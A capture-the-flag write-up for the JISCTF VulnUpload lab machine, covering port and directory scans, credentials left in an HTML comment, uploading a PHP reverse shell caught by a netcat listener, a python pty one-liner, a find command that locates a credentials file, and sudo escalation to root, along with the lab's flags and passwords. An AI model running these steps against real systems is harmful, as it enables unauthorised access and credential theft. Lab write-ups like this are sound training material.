@@ -1,0 +1,218 @@
+JISCTF:VulnUpload is a boot2root intermediate machine.
+IP:192.168.0.108
+
+Nmap scan results:
+
+root@LAPTOP-U5913CMD:/home/akshay# nmap -A -T4 -p- 192.168.0.108
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-30 20:54 IST
+Nmap scan report for 192.168.0.108
+Host is up (0.0012s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 af:b9:68:38:77:7c:40:f6:bf:98:09:ff:d9:5f:73:ec (RSA)
+|   256 b9:df:60:1e:6d:6f:d7:f6:24:fd:ae:f8:e3:cf:16:ac (ECDSA)
+|_  256 78:5a:95:bb:d5:bf:ad:cf:b2:f5:0f:c0:0c:af:f7:76 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 8 disallowed entries 
+| / /backup /admin /admin_area /r00t /uploads 
+|_/uploaded_files /flag
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| http-title: Sign-Up/Login Form
+|_Requested resource was login.php
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=9/30%OT=22%CT=1%CU=32674%PV=Y%DS=2%DC=T%G=Y%TM=5F74A34
+OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)OPS
+OS:(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST1
+OS:1NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
+OS:(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=9C63%RUD=G)IE(R=Y%DFI=N%T=40
+OS:%CD=S)
+
+
+Dirb scan results given as follows:
+
+---- Scanning URL: http://192.168.0.108/ ----
+==> DIRECTORY: http://192.168.0.108/admin_area/                                                                                                               
+==> DIRECTORY: http://192.168.0.108/assets/                                                                                                                   
+==> DIRECTORY: http://192.168.0.108/css/                                                                                                                      
+==> DIRECTORY: http://192.168.0.108/flag/                                                                                                                     
++ http://192.168.0.108/index.php (CODE:302|SIZE:1228)                                                                                                         
+==> DIRECTORY: http://192.168.0.108/js/                                                                                                                       
++ http://192.168.0.108/robots.txt (CODE:200|SIZE:160)                                                                                                         
++ http://192.168.0.108/server-status (CODE:403|SIZE:301)                                                                                                      
+                                                                                                                                                              
+---- Entering directory: http://192.168.0.108/admin_area/ ----
++ http://192.168.0.108/admin_area/index.php (CODE:200|SIZE:224)                                                                                               
+                                                                                                                                                              
+---- Entering directory: http://192.168.0.108/assets/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                                              
+---- Entering directory: http://192.168.0.108/css/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                                              
+---- Entering directory: http://192.168.0.108/flag/ ----
++ http://192.168.0.108/flag/index.html (CODE:200|SIZE:109)                                                                                                    
+                                                                                                                                                              
+---- Entering directory: http://192.168.0.108/js/ 
+
+Lets go through each and every section.
+
+
+The 1st flag is : {8734509128730458630012095}
+
+Got this first flag under /flag/ directory.
+
+Robots.txt : 
+
+User-agent: *
+Disallow: /
+Disallow: /backup
+Disallow: /admin
+Disallow: /admin_area
+Disallow: /r00t
+Disallow: /uploads
+Disallow: /uploaded_files
+Disallow: /flag
+
+
+<html>
+<head>
+<title>
+Fake admin area :)
+</title>
+<body>
+<center><h1>The admin area not work :) </h1></center>
+<!--	username : admin
+	password : 3v1l_H@ck3r
+	The 2nd flag is : {7412574125871236547895214}
+-->
+</body>
+</html>
+
+Got second flag as well as username as admin and password as 3v1l_H@ck3r
+
+http://192.168.0.108/login.php
+
+We got login page so lets try logging in using this username and password.
+
+We can upload files to the webserver and by looking at this we can upload a reverse shell (php)
+
+I fired up netcat listener on the port 1234
+
+C:\Users\Voker\Downloads\netcat-win32-1.12>nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [192.168.0.106] from (UNKNOWN) [192.168.0.108] 56694
+Linux Jordaninfosec-CTF01 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+ 18:51:30 up 27 min,  0 users,  load average: 1.13, 0.99, 0.74
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+Lets make this a stable shell using python
+
+python3 -c "import pty;pty.spawn('/bin/bash')"
+
+www-data@Jordaninfosec-CTF01:/$ ls
+ls
+bin   home            lib64       opt   sbin  tmp      vmlinuz.old
+boot  initrd.img      lost+found  proc  snap  usr
+dev   initrd.img.old  media       root  srv   var
+etc   lib             mnt         run   sys   vmlinuz
+www-data@Jordaninfosec-CTF01:/$
+
+www-data@Jordaninfosec-CTF01:/var/www/html$ cat hint.txt
+cat hint.txt
+try to find user technawi password to read the flag.txt file, you can find it in a hidden file ;)
+
+The 3rd flag is : {7645110034526579012345670}
+www-data@Jordaninfosec-CTF01:/var/www/html$
+
+Got 3rd flag..2 more to go
+
+So after a long time I got the credentials.
+
+I had to use the following command to get the credentials.
+
+find / -user technawi -type f | grep -v "Permission"
+
+find: '/etc/polkit-1/localauthority': Permission denied
+/etc/mysql/conf.d/credentials.txt
+find: '/etc/ssl/private': Permission denied
+find: '/etc/lvm/archive': Permission denied
+find: '/etc/lvm/backup': Permission denied
+find: '/root': Permission denied
+find: '/var/lib/snapd/cookie': Permission denied
+find: '/var/lib/snapd/void': Permission denied
+find: '/var/lib/php/sessions': Permission denied
+find: '/var/lib/polkit-1': Permission denied
+find: '/var/lib/mysql-keyring': Permission denied
+find: '/var/lib/mysql-files': Permission denied
+find: '/var/lib/mysql': Permission denied
+find: '/var/lib/apt/lists/partial': Permission denied
+find: '/var/log/apache2': Permission denied
+find: '/var/log/mysql': Permission denied
+find: '/var/log/unattended-upgrades': Permission denied
+find: '/var/cache/ldconfig': Permission denied
+find: '/var/cache/apt/archives/partial': Permission denied
+/var/www/html/flag.txt
+
+/etc/mysql/conf.d/credentials.txt
+
+The password of the user technawi is in the following file.
+
+www-data@Jordaninfosec-CTF01:/etc/mysql/conf.d$ cat credentials.txt
+cat credentials.txt
+The 4th flag is : {7845658974123568974185412}
+
+username : technawi
+password : 3vilH@ksor
+www-data@Jordaninfosec-CTF01:/etc/mysql/conf.d$
+
+Got the 4th flag...noice
+technawi@Jordaninfosec-CTF01:/etc/mysql/conf.d$ id
+id
+uid=1000(technawi) gid=1000(technawi) groups=1000(technawi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+technawi@Jordaninfosec-CTF01:/etc/mysql/conf.d$
+
+technawi@Jordaninfosec-CTF01:/var/www/html$ cat flag.txt
+cat flag.txt
+The 5th flag is : {5473215946785213456975249}
+
+Good job :)
+
+You find 5 flags and got their points and finish the first scenario....
+technawi@Jordaninfosec-CTF01:/var/www/html$
+
+Wow we r done lol..lets try to get root access to the machine.
+
+technawi@Jordaninfosec-CTF01:/var/www/html$ sudo -l
+sudo -l
+[sudo] password for technawi: 3vilH@ksor
+
+Matching Defaults entries for technawi on Jordaninfosec-CTF01:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User technawi may run the following commands on Jordaninfosec-CTF01:
+    (ALL : ALL) ALL
+technawi@Jordaninfosec-CTF01:/var/www/html$ sudo bash
+sudo bash
+root@Jordaninfosec-CTF01:/var/www/html# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@Jordaninfosec-CTF01:/var/www/html#
+
+
+Wew that was simple...it was a fun machine.
+
+Thank you.... Happy Hacking :)
